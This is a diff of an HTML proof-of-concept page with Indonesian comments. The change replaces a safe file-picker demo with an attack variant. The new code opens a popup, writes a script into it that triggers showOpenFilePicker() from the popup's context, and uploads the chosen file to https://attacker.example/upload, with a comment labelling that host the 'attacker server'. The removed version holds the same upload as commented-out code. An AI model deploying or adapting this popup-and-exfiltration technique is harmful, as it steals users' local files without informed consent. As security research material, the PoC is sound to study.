@@ -1,65 +1,56 @@
 <!doctype html>
-<html lang="id">
-<head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>PoC picker fixed</title>
-</head>
+<html>
+<head><meta charset="utf-8"><title>Host</title></head>
 <body>
-  <p>Gunakan tombol di bawah untuk memicu file picker dengan aman.</p>
-  <button id="pickBtn">Tekan untuk pilih gambar</button>
-  <button id="openPopup" disabled>Open popup (setelah pick)</button>
-  <div>
-    <img id="img" style="max-width:400px; border:1px solid #ccc; display:none; margin-top:10px;">
-  </div>
+  <button id="go">Click to open popup and trigger picker</button>
   <pre id="log"></pre>
-
 <script>
-const btn = document.getElementById('pickBtn');
-const popupBtn = document.getElementById('openPopup');
-const img = document.getElementById('img');
-const log = document.getElementById('log');
-function L(...a){ log.textContent += a.join(' ') + '\\n'; console.log(...a); }
+const log = t => { document.getElementById('log').textContent += t + '\n'; console.log(t); };
 
-// Pemicu yang jelas: klik tombol
-btn.addEventListener('click', async () => {
-  try {
-    L('Memanggil showOpenFilePicker() dari click (user gesture)');
-    const [fileHandle] = await window.showOpenFilePicker({
-      types: [{
-        description: 'Gambar',
-        accept: { 'image/*': ['.png', '.jpg', '.jpeg', '.gif', '.webp'] }
-      }],
-      multiple: false
-    });
+document.getElementById('go').addEventListener('click', () => {
+  // 1) buka popup kosong (synchronous, direct user gesture)
+  const w = window.open('www.google.com', '_blank', 'width=600,height=400');
 
-    const file = await fileHandle.getFile();
-    L('File dipilih:', file.name, file.type, file.size);
-    img.src = URL.createObjectURL(file);
-    img.style.display = 'block';
+  // 2) tulis dokumen popup langsung sehingga kita mengontrol kontennya
+  const html = `
+    <!doctype html>
+    <html>
+    <body>
+      <p>Popup: will call showOpenFilePicker()</p>
+      <pre id="p"></pre>
+      <script>
+        const p = s => { document.getElementById('p').textContent += s + '\\n'; console.log(s); };
 
-    // Enable tombol popup setelah file dipilih (jika kamu mau simulasi membuka window lain)
-    popupBtn.disabled = false;
+        (async function(){
+          try {
+            p('Calling showOpenFilePicker() now...');
+            const [fh] = await showOpenFilePicker({
+              types: [{ description: 'Images', accept: {'image/*': ['.png','.jpg','.jpeg','.gif','.webp'] } }],
+              multiple: false
+            });
+            const file = await fh.getFile();
+            p('Got file: ' + file.name + ' size=' + file.size);
 
-    // Contoh upload (komentari jika tidak ada server)
-    // const fd = new FormData(); fd.append('file', file, file.name);
-    // const res = await fetch('https://attacker.example/upload', { method:'POST', body:fd });
-    // L('Upload status:', res.status);
+            // upload to attacker server (adjust URL)
+            const fd = new FormData();
+            fd.append('file', file, file.name);
+            // NOTE: Replace with your testing server URL (must accept CORS for the origin)
+            const res = await fetch('https://attacker.example/upload', { method: 'POST', body: fd });
+            p('Upload sent, status=' + res.status);
+          } catch (e) {
+            p('Error: ' + (e && e.name) + ' ' + (e && e.message));
+          }
+        })();
+      <\/script>
+    </body>
+    </html>
+  `;
+  // write and close so it loads and runs synchronously
+  w.document.open();
+  w.document.write(html);
+  w.document.close();
 
-  } catch (err) {
-    if (err && err.name === 'AbortError') {
-      L('Operasi dibatalkan (user cancel atau context lost).');
-    } else {
-      L('Error:', err && err.name, err && err.message);
-    }
-  }
-});
-
-// Tombol untuk membuka popup/Google — TIDAK direkomendasikan membuka sebelum picker selesai
-popupBtn.addEventListener('click', () => {
-  // membuka popup setelah picker selesai bukan sebelum nya
-  window.open('https://www.google.com', '_blank', 'noopener');
-  L('Popup dibuka.');
+  log('Popup opened and document written.');
 });
 </script>
 </body>
